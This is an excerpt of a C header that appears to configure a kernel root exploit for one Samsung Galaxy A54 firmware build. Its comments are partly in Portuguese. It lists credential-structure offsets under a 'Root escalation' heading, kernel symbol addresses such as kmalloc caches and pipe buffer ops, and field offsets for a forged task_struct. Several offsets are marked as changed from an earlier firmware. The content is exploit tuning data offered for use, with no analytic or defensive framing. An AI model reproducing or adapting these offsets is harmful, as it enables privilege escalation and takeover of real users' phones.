 ...
 * Samsung Galaxy A54 5G (SM-A546E)
 * Firmware  : A546EXXSLFZG3 (ZTO - Brazil/TIM)
 * Kernel    : 5.15.189-android13-3-33470412
 * Built     : Mon Jul 6 14:03:17 KST 2026
 * boot SHA256: BBB0877153DCDBD6A6D053272F6DBEF66FBA54EB26C3D5CDA5E5213FC7F150D8
 * kernel SHA256: 33DB7DCA0777F1C626C4EA14BC8C6D5AE6D45FCF569ADFC3FD8BAD4D8D3B7181
 * ------------------------------------------------------------------------- */
#define BUILD_VARIANT_LABEL "a54x-A546EXXSLFZG3-app"
#define PHYS_P0_ORACLE 1
#define SLIDE_ROUTE SLIDE_ROUTE_FPSIMD
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a54xnsxx/a54x:16/BP4A.260706.000/A546EXXSLFZG3:user/release-keys"
#endif
...
/* ---------------------------------------------------------------------------
 * Route / build tuning (idêntico ao FZF4 — mesma plataforma)
 * ------------------------------------------------------------------------- */
 ...
 * Root escalation
 * ------------------------------------------------------------------------- */
#define TASK_STRUCT_CRED_OFF        0x798ULL  /* pahole confirmado */
#define TASK_STRUCT_REAL_CRED_OFF   0x790ULL  /* pahole confirmado */
...
/* ---------------------------------------------------------------------------
 * Static kernel symbol offsets (text-relative, base=0xffffffc008000000)
 *
 * Diferenças vs FZF4 marcadas com [DIFF]
 * ------------------------------------------------------------------------- */
...
#define KMALLOC_CACHES_OFF                  0x01ae8db0ULL  /* [DIFF] FZF4=0x01ae8c30 */
#define ANON_PIPE_BUF_OPS_OFF               0x018f6fa0ULL  /* [DIFF] FZF4=0x018f6e20 */
...
#define ASHMEM_FOPS_OFF                     0x01a97bb0ULL  /* [DIFF] FZF4=0x01a97a30 */
...
/* --- fake task_struct layout (pahole confirmado) -------------------------- */
#define FAKE_TASK_USAGE_OFF         0x38   /* pahole: offset 56  */
#define FAKE_TASK_PRIO_OFF          0x7c   /* pahole: offset 124 */
#define FAKE_TASK_NORMAL_PRIO_OFF   0x84   /* pahole: offset 132 */
#define FAKE_TASK_PI_LOCK_OFF       0x884  /* pahole: offset 2180 */
#define FAKE_TASK_PI_WAITERS_OFF    0x898  /* pahole: offset 2200 */
#define FAKE_TASK_PI_TOP_TASK_OFF   0x8a8  /* pahole: offset 2216 */
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0  /* pahole: offset 2224 */
...
/* ---------------------------------------------------------------------------
 * file_operations struct layout (pahole confirmado)
 * ------------------------------------------------------------------------- */
